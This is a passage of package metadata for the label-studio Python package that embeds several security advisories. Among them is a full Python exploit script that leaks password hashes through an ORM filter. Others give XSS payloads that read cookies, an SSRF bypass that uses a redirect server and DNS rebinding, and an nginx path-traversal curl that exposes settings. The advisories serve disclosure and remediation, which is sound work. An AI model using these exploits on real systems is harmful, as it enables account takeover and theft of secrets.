all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.3.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.3.post0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","google-cloud-logging (==2.6.0)","Django (==3.1.13)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.32)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.3.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"70c260867b7fcb94b3235e6974c0b18b263c942156e880b431007e8719329dad","md5":"bb9335276fc93d99b355bb5f5759064c","sha256":"4a5877c23166cf218e694ff36cf134e3d4371e03eb5b3059a3ae9cc1bd5981f5"},"downloads":-1,"filename":"label_studio-1.3.post0-py3-none-any.whl","has_sig":false,"md5_digest":"bb9335276fc93d99b355bb5f5759064c","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":48313400,"upload_time":"2021-09-18T12:49:34","upload_time_iso_8601":"2021-09-18T12:49:34.458781Z","url":"https://files.pythonhosted.org/packages/70/c2/60867b7fcb94b3235e6974c0b18b263c942156e880b431007e8719329dad/label_studio-1.3.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"ac80ba7fcde93135fcc72eb82a681e05ae59ed2321c27878d7dd4e17d2f9ae3e","md5":"7afbd906a50cef068bcc4c95ffa92f35","sha256":"d6d663dae08bc487636fd51b254d0e812166557f0d042b4b64783f60ab4217ce"},"downloads":-1,"filename":"label-studio-1.3.post0.tar.gz","has_sig":false,"md5_digest":"7afbd906a50cef068bcc4c95ffa92f35","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":47256654,"upload_time":"2021-09-18T12:52:01","upload_time_iso_8601":"2021-09-18T12:52:01.976028Z","url":"https://files.pythonhosted.org/packages/ac/80/ba7fcde93135fcc72eb82a681e05ae59ed2321c27878d7dd4e17d2f9ae3e/label-studio-1.3.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = 